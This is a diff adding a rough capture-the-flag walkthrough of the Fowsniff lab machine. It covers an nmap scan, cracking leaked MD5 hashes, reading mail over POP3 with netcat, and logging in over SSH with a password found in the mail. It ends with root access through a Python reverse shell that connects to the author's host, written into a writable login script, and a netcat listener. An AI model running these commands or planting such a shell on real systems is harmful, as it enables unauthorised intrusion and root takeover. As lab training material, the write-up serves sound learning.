@@ -1,0 +1,214 @@
+10.10.221.193
+this is the ip address provided to us
+
+nmap scan-
+
+nmap 10.10.221.193 -F
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-03 11:27 EDT
+Nmap scan report for 10.10.221.193
+Host is up (0.56s latency).
+Not shown: 96 closed ports
+PORT    STATE SERVICE
+22/tcp  open  ssh
+80/tcp  open  http
+110/tcp open  pop3
+143/tcp open  imap
+
+Nmap done: 1 IP address (1 host up) scanned in 5.78 seconds
+
+when we visit the webpage at port 80 we find that the is a twiiter id which has been provided to us
+now what we are going to do is look outo for that twiiter id
+
+thingh on website----
+
+
+Fowsniff's internal system suffered a data breach that resulted in the exposure of employee usernames and passwords.
+
+Client information was not affected.
+
+Due to the strong possibility that employee information has been made publicly available, all employees have been instructed to change their passwords immediately.
+
+The attackers were also able to hijack our official @fowsniffcorp Twitter account. All of our official tweets have been deleted and the attackers may release sensitive information via this medium. We are working to resolve this at soon as possible.
+
+We will return to full capacity after a service upgrade.
+
+
+
+
+@fowsniffcorp 
+https://twitter.com/fowsniffcorp?lang=en
+when we go to this page of twitter we do find a hashdump of passwords
+https://pastebin.com/NrAqVeeX
+
+
+
+now we will crack all the passwords using hashcat and as in the hashdump its given that the hash is md5
+so let's see
+
+we can crack them easily
+now what we have to do is find one for the serina
+and using hascat we do the password to be 
+>>>>>>>>>>scoobydoo2
+
+
+sysadmin? roflcopter
+stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd
+
+
+
+now as its given we can use this to login to the pop3 server 
+use
+nc <ip> 110
+user seina
+pass scoobydoo2
+list 
+
+and we will get the list of the emails she recived
+
+1 1622
+2 1280
+.
+
+ret 1
+
+Return-Path: <stone@fowsniff>
+X-Original-To: seina@fowsniff
+Delivered-To: seina@fowsniff
+Received: by fowsniff (Postfix, from userid 1000)
+        id 0FA3916A; Tue, 13 Mar 2018 14:51:07 -0400 (EDT)
+To: baksteen@fowsniff, mauer@fowsniff, mursten@fowsniff,
+    mustikka@fowsniff, parede@fowsniff, sciana@fowsniff, seina@fowsniff,
+    tegel@fowsniff
+Subject: URGENT! Security EVENT!
+Message-Id: <20180313185107.0FA3916A@fowsniff>
+Date: Tue, 13 Mar 2018 14:51:07 -0400 (EDT)
+From: stone@fowsniff (stone)
+
+Dear All,
+
+A few days ago, a malicious actor was able to gain entry to
+our internal email systems. The attacker was able to exploit
+incorrectly filtered escape characters within our SQL database
+to access our login credentials. Both the SQL and authentication
+system used legacy methods that had not been updated in some time.
+
+We have been instructed to perform a complete internal system
+overhaul. While the main systems are "in the shop," we have
+moved to this isolated, temporary server that has minimal
+functionality.
+
+This server is capable of sending and receiving emails, but only
+locally. That means you can only send emails to other users, not
+to the world wide web. You can, however, access this system via 
+the SSH protocol.
+
+The temporary password for SSH is "S1ck3nBluff+secureshell"
+
+You MUST change this password as soon as possible, and you will do so under my
+guidance. I saw the leak the attacker posted online, and I must say that your
+passwords were not very secure.
+
+Come see me in my office at your earliest convenience and we'll set it up.
+
+Thanks,
+A.J Stone
+
+
+
+and he second email is
+
+
+retr 2
++OK 1280 octets
+Return-Path: <baksteen@fowsniff>
+X-Original-To: seina@fowsniff
+Delivered-To: seina@fowsniff
+Received: by fowsniff (Postfix, from userid 1004)
+        id 101CA1AC2; Tue, 13 Mar 2018 14:54:05 -0400 (EDT)
+To: seina@fowsniff
+Subject: You missed out!
+Message-Id: <20180313185405.101CA1AC2@fowsniff>
+Date: Tue, 13 Mar 2018 14:54:05 -0400 (EDT)
+From: baksteen@fowsniff
+
+Devin,
+
+You should have seen the brass lay into AJ today!
+We are going to be talking about this one for a looooong time hahaha.
+Who knew the regional manager had been in the navy? She was swearing like a sailor!
+
+I don't know what kind of pneumonia or something you brought back with
+you from your camping trip, but I think I'm coming down with it myself.
+How long have you been gone - a week?
+Next time you're going to get sick and miss the managerial blowout of the century,
+at least keep it to yourself!
+
+I'm going to head home early and eat some chicken soup. 
+I think I just got an email from Stone, too, but it's probably just some
+"Let me explain the tone of my meeting with management" face-saving mail.
+I'll read it when I get back.
+
+Feel better,
+
+Skyler
+
+PS: Make sure you change your email password. 
+AJ had been telling us to do that right before Captain Profanity showed up.
+
+
+
+by using the username as
+baksteen and password as S1ck3nBluff+secureshell
+we are able to ssh into the server
+
+we have to find a file which will seem peculiar
+----->
+find / -type f -group 100 2>>/dev/null
+
+/opt/cube/cube.sh
+
+
+
+now as stated we hae to make a reverse shell from this
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<IP>,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+the command after editing--------->
+
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.25.132",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+now after saving this inside the cube.sh
+
+we will relogin and we will put our nc on port 1234
+nc -lvnp 1234
+and we will get a shell whihc has root priv when we put the password
+and now we cat the root.txt
+inside the root dir
+
+
+cat flag.txt
+   ___                        _        _      _   _             _ 
+  / __|___ _ _  __ _ _ _ __ _| |_ _  _| |__ _| |_(_)___ _ _  __| |
+ | (__/ _ \ ' \/ _` | '_/ _` |  _| || | / _` |  _| / _ \ ' \(_-<_|
+  \___\___/_||_\__, |_| \__,_|\__|\_,_|_\__,_|\__|_\___/_||_/__(_)
+               |___/ 
+
+ (_)
+  |--------------
+  |&&&&&&&&&&&&&&|
+  |    R O O T   |
+  |    F L A G   |
+  |&&&&&&&&&&&&&&|
+  |--------------
+  |
+  |
+  |
+  |
+  |
+  |
+ ---
+
+Nice work!
+
+This CTF was built with love in every byte by @berzerk0 on Twitter.
+
+Special thanks to psf, @nbulischeck and the whole Fofao Team.
